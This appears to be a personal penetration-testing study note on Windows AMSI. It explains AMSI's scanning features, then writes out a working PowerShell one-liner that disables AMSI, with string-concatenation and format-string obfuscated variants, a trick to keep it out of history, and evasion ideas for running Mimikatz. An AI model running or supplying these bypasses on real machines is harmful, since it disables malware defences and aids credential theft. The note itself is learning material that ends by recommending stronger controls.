	#windows-bypass 

- amsi is a verstaile interface which allows you application and services to integrate any antimalware product means any Antivirus can be integrated in your application and service with the help of amsi 
- it is designed to allow for the most used or commonly used techniques for malware scanning and protection  provided by most of the antimalware products out there which can be integrated into applications 
- it supports a calling structure allowing for file and memory or stream scanning , content source URL/IP reputation checks , and other techniques 

### 1. **Calling Structure**

The calling structure in AMSI refers to how applications interact with the AMSI API. Applications can call AMSI functions to scan files, memory, or other content to determine if they are malicious. The structure typically includes initializing AMSI, scanning content, and handling the results.

### 2. **File and Memory or Stream Scanning**

- **File Scanning**: This involves scanning files stored on disk for malware. The AMSI API can be called to scan a file's contents, and it will return a verdict on whether the file is malicious.
- **Memory Scanning**: This involves scanning the contents of a computer's memory (RAM) to detect malware that is running in memory but not necessarily stored on disk.
- **Stream Scanning**: This is the process of scanning data streams, such as network traffic or data being read/written in real-time, to detect malicious content.

### 3. **Content Source URL/IP Reputation Checks**

- **URL Reputation Check**: This involves checking the reputation of a URL to determine if it is known to be associated with malicious activity, phishing, or other threats. AMSI can interface with reputation services to provide this information.
- **IP Reputation Check**: Similar to URL checks, this involves evaluating the reputation of an IP address to see if it is known for distributing malware, hosting malicious websites, or participating in other malicious activities.

### 4. **Other Techniques**

This can encompass a variety of additional methods for detecting and handling malware, such as:

- **Heuristic Analysis**: Identifying potential threats based on behavior patterns rather than known signatures.
- **Sandboxing**: Running potentially malicious code in an isolated environment to observe its behavior safely.
- **Machine Learning**: Utilizing algorithms to detect new and evolving threats based on patterns learned from large datasets.

### Example Usage in AMSI

An application might use AMSI to scan a downloaded file before allowing it to be executed. The process might look something like this:

1. **Initialize AMSI**: The application initializes the AMSI interface.
2. **Scan File**: The file is passed to AMSI for scanning.
3. **Reputation Check**: AMSI might check the URL or IP from which the file was downloaded to determine if it is from a known malicious source.
4. **Receive Verdict**: AMSI returns a result indicating whether the file is clean or malicious.
5. **Take Action**: Based on the result, the application can block the file, alert the user, or allow execution.

there is numberous ways to bypass amsi we discussed one of them in [[Popular Powershell Attack Tools#Anti Malware Scan Interface]]
the url for those technique [AMSI BYPASS GITHUB REPO](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

One of them is just a one liner to bypass amsi 
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
this code will say look at yourself powershell and retrieve a variable called amsiinitfailed and then set that variable to true it means that when powershell initializes amsi the success of that connection is defined in that variable if we set that variable to true powershell will determine there is some kind of problem and does not send those commands to amsi for scanning 

amsi will not allow to execute this oneliner bcz it contains some keywords which are considered as malicious like `amsiutils` and `amsiInitFailed` if you modify it or youcan say some what obfuscate it . it will run . The most basic way is to do some concatination of those keywords 

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

$a = "System.Management.Automation.Amsi"+"Utils"
$b = "amsi"+"Init"+"Failed"

[Ref].Assembly.GetType($a).GetField($b,'NonPublic,Static').SetValue($null,$true)
```
now this code will run and if we dont want this to be in history file add `#token ` at the end of the command 
	if this code still give malicious errors we have to use a tool called invoke-obfuscation here 
it will look like this when we reorder strings in that command 
```
[Ref].Assembly.GetType(("{6}{11}{3}{7}{8}{9}{2}{0}{5}{10}{1}{4}" -f'utomati','Util','t.A','M','s','on.Ams','System','anag','e','men','i','.')).GetField(("{1}{3}{2}{0}" -f'itFailed','a','siIn','m'),("{1}{3}{2}{0}"-f'tic','No','blic,Sta','nPu')).SetValue($null,$true)
```
now it bypass AMSI 
but still some scripts will not run bcz antivirus will block it 
![[Pasted image 20240808181810.png]]
bcz other than av there are still some more extra layer protection in AV  
- **Signature-Based Detection**: Most AVs use signature-based detection to identify known malicious tools like Mimikatz. Even if AMSI is bypassed, the AV can still detect and block the execution based on known signatures.
    
- **Heuristic Analysis**: AVs often use heuristic analysis to detect suspicious behavior. Mimikatz performs actions that are typically associated with malicious behavior (e.g., accessing and dumping credentials), which can trigger heuristic detection.
    
- **Behavioral Monitoring**: Some AVs use behavioral analysis to monitor the actions of programs in real-time. Even if a script bypasses AMSI, the AV might still block it if it detects behavior consistent with known attack patterns.
    
- **Memory Scanning**: AVs can scan processes in memory for known malicious patterns. Even if the script isn't flagged on disk, the AV can detect and block Mimikatz when it tries to run in memory.

### ways to evade 
- **Obfuscation**: Obfuscating the Mimikatz script can sometimes evade signature-based detection. However, advanced AVs may still catch it based on behavior.
    
- **Custom Compilation**: Compiling a custom version of Mimikatz from source with modifications might help evade detection. This changes the signature of the executable, making it less likely to be flagged.
    
- **Reflective DLL Injection**: Instead of running Mimikatz directly, you can inject it reflectively into a process. This might bypass some AV protections, although advanced AVs with memory protection features might still catch it.
    
- **Living Off the Land Binaries (LoLBins)**: Using legitimate Windows binaries or scripting tools to perform similar actions as Mimikatz can sometimes bypass AV detection. However, this requires deep knowledge of Windows internals and the actions you need to perform.
    
- **Disable or Bypass AV Temporarily**: In some cases, you might need to find a way to disable or bypass the AV entirely, but this is highly dependent on the specific environment and AV solution in place.

we tried [[Popular Powershell Attack Tools]] on this AMSI bypass and most of the tools are working except mimikatz 

![[Pasted image 20240808183740.png]]
**conclusion** we cannot rely on AMSI . we have to look for JEA OR contrain language mode for better security . we discussed JEA on remote computers but **we can also setup jea on local hosts and local users ..** 

